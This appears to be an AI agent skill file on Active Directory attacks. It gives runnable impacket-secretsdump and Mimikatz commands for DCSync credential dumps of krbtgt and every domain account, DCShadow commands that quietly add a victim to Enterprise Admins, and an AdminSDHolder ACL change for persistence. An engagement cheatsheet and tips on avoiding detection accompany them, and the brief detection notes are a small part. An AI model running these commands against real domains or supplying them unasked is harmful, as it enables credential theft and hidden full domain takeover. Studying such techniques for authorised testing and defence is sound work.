---
name: offensive-dcsync-dcshadow
description: "DCSync (request replication, dump krbtgt and other secrets) and DCShadow (register a rogue DC, push attacker-controlled changes that bypass standard audit). Use to extract domain hashes via DCSync, or to make persistent AD changes that don't appear in normal DC audit logs via DCShadow."
---

# DCSync / DCShadow

DCSync uses the MS-DRSR replication protocol to request password material from a DC. DCShadow registers as a temporary DC and pushes changes that bypass standard audit because they look like inter-DC replication.

## DCSync

### Required Rights

- `Replicating Directory Changes`
- `Replicating Directory Changes All`
- `Replicating Directory Changes In Filtered Set`

Granted to: Domain Admins, Enterprise Admins, Administrators (BUILTIN), AAD Connect MSOL_*, Azure AD Connect.

Acquire via:
- Direct DA membership
- ACL grant via WriteDacl on domain root (see `offensive-acl-abuse`)
- AAD Connect server compromise

### Execute DCSync

```bash
# Single user
impacket-secretsdump -just-dc-user 'corp/krbtgt' corp/admin@dc -hashes :<NThash>

# All users (full dump)
impacket-secretsdump corp/admin@dc -hashes :<NThash>

# Cleartext where available
impacket-secretsdump corp/admin@dc -hashes :<NThash> -just-dc-ntlm
```

```powershell
# Mimikatz
mimikatz.exe
> lsadump::dcsync /domain:corp.local /user:krbtgt
> lsadump::dcsync /domain:corp.local /all
```

### High-Value Targets

- `krbtgt` — Golden Ticket
- `Administrator` — direct admin auth
- Service accounts — Silver Tickets, lateral
- AAD Connect MSOL_* — hybrid identity pivots
- Computer accounts (DC$) — Silver Tickets for that DC

### Detection

MDI's primary catch is "DCSync from non-DC source IP." Defenders see:
- DC event 4662 with object access for naming context
- IP source != known DC

Quieter alternative: use a compromised DC as the DCSync source (relays through legitimate DC).

## DCShadow

Register as a temporary DC, push changes, deregister. Bypasses standard DC audit because the changes appear as inter-DC replication, not direct user actions.

### Required Rights

- `DS-Install-Replica` (typically Domain Admin)
- Less commonly: specific SPN write permissions

### Execute

```
mimikatz # !+
mimikatz # !processtoken
mimikatz # lsadump::dcshadow /object:CN=victim,CN=Users,DC=corp,DC=local /attribute:primaryGroupID /value:519
mimikatz # lsadump::dcshadow /push
```

This adds the victim to "Enterprise Admins" (RID 519) without the change appearing in standard DC audit logs.

### Use Cases

- **Persistence via primary group ID**: hide privileged group membership in `primaryGroupID`
- **AdminSDHolder modification**: Change ACL on AdminSDHolder to grant attacker rights, propagated via SDProp every 60 minutes
- **Add SPN**: enable Kerberoasting on a specific account
- **Delete-protection bypass**: mark protected accounts as deletable

### Detection

DCShadow is detection-resistant against standard audit but catches well in:
- LDAP audit logs (some products inspect inter-DC traffic)
- Non-standard DC source identifying as a DC (network anomaly)
- Repeated short-lived DC registrations

MDI catches DCShadow specifically — post-2019 detections are reasonable.

## AdminSDHolder Persistence

AdminSDHolder is a protected container that propagates ACLs to all "protected" accounts (DA, EA, AdminSDHolder itself). Modify it:

```powershell
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=corp,DC=local' \
  -PrincipalIdentity attacker -Rights GenericAll
```

SDProp runs every 60 minutes by default. Within an hour, the attacker has GenericAll on every protected account → password resets, full takeover.

## Engagement Cheatsheet

```bash
# 1. DCSync krbtgt for Golden Ticket
impacket-secretsdump -just-dc-user corp/krbtgt corp/admin@dc -hashes :<hash>

# 2. DCSync all for full domain dump
impacket-secretsdump corp/admin@dc -hashes :<hash>

# 3. DCShadow for stealth persistence
# (mimikatz live; requires admin context on the running host)

# 4. AdminSDHolder for slow-burn persistence
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,...' -PrincipalIdentity attacker -Rights GenericAll

# 5. Document each: technique, accounts touched, detection observed
```

## Key References

- "DCShadow" (Vincent Le Toux, Benjamin Delpy)
- impacket-secretsdump
- "AdminSDHolder Persistence" (Sean Metcalf)
- Source: https://github.com/SnailSploit/offensive-checklist/blob/main/dcsync-dcshadow.md
